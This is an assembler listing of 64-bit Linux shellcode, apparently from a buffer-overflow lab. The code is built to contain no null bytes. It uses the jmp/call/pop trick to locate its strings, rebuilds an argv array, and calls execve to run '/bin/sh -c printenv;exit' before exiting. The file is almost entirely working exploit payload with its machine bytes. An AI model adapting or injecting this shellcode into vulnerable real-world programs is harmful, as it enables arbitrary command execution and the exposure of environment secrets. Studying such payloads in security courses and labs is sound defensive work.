     1                                            bits 64
     2                                              ; find out where we are
     3 00000000 EB50                    start:     jmp short codeEnd
     4 00000002 5E                      start2:    pop rsi
     5                                              ; clear the a register
     6 00000003 4831C0                             xor rax,rax
     7                                              ; restore null bytes to data
     8 00000006 884607                             mov [byte rsi+flagStr-exeStr-2],al
     9 00000009 88460B                             mov [byte rsi+cmdStr-exeStr-1],al
    10 0000000C 884619                             mov [byte rsi+arrayAddr-exeStr-1],al
    11 0000000F 48894632                           mov [byte rsi+arrayAddr-exeStr+24],rax
    12                                             
    13                                              ; restore argv
    14                                              
    15 00000013 4889761A                           mov [byte rsi + arrayAddr - exeStr],rsi
    16 00000017 488D7E09                           lea rdi,[byte rsi + flagStr - exeStr] 
    17 0000001B 48897E22                           mov [byte rsi + arrayAddr - exeStr + 8],rdi
    18 0000001F 488D7E0C                           lea rdi, [byte rsi + cmdStr - exeStr]
    19 00000023 48897E2A                           mov [byte rsi + arrayAddr - exeStr + 16],rdi
    20                                  
    21                                              ; execve system call
    22 00000027 B03B                               mov al,0x3b
    23 00000029 4889F7                             mov rdi,rsi
    24 0000002C 488D771A                           lea rsi,[byte rdi + arrayAddr - exeStr]
    25 00000030 4889E2                             mov rdx,rsp
    26 00000033 48C1EA20                           shr rdx,32
    27 00000037 48C1E220                           shl rdx,32
    28 0000003B B90056FBF7                         mov ecx,0xf7fb5600
    29                                             ;xor cl,0xff
    30 00000040 4809CA                             or  rdx,rcx
    31 00000043 488D3A                             lea rdi,[rdx]
    32 00000046 0F05                               syscall
    33                                  
    34                                              ; exit system call
    35 00000048 4889C7                             mov rdi,rax
    36 0000004B 4831C0                             xor rax,rax
    37 0000004E B03C                               mov al,0x3c
    38 00000050 0F05                               syscall
    39                                  
    40 00000052 E8ABFFFFFF              codeEnd:   call start2
    41                                              ; data
    42 00000057 2F62696E2F73685879      exeStr:    db "/bin/shXy"
    43 00000060 2D6358                  flagStr:   db "-cX"
    44 00000063 7072696E74656E763B-     cmdStr:    db "printenv;exitX"
    44 0000006C 6578697458         
    45 00000071 FFFFFFFFFFFFFFFF        arrayAddr: dq 0xffffffffffffffff
    46 00000079 FFFFFFFFFFFFFFFF                   dq 0xffffffffffffffff
    47 00000081 FFFFFFFFFFFFFFFF                   dq 0xffffffffffffffff
    48 00000089 FFFFFFFFFFFFFFFF                   dq 0xffffffffffffffff
    49 00000091 91000000                newAddr:   dd newAddr-start
